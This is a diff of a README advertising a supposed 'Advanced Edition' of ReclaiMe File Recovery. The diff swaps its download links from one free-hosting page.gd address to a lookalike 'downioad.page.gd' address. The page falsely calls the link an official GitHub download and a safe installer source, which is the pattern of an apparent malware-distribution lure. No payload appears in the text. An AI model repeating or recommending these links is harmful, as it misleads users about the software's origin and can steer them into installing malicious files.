@@ -2,7 +2,7 @@
 
 ReclaiMe File Recovery Advanced Edition is a sophisticated software application engineered to assist users in retrieving lost, deleted, or inaccessible files from various storage devices on Windows platforms. This enhanced tool incorporates cutting-edge technology to improve upon the original ReclaiMe File Recovery, offering greater accuracy and speed in data recovery operations. Whether due to accidental deletion, formatting errors, or system crashes, this utility stands ready to restore your valuable data efficiently.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -53,7 +53,7 @@ A: ReclaiMe File Recovery Advanced Edition includes an auto-update feature. You 
 
 To access the most recent version of ReclaiMe File Recovery Advanced Edition, click on the link below. This will direct you to the official GitHub download page where you can obtain the installer safely.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Usage Tips
 
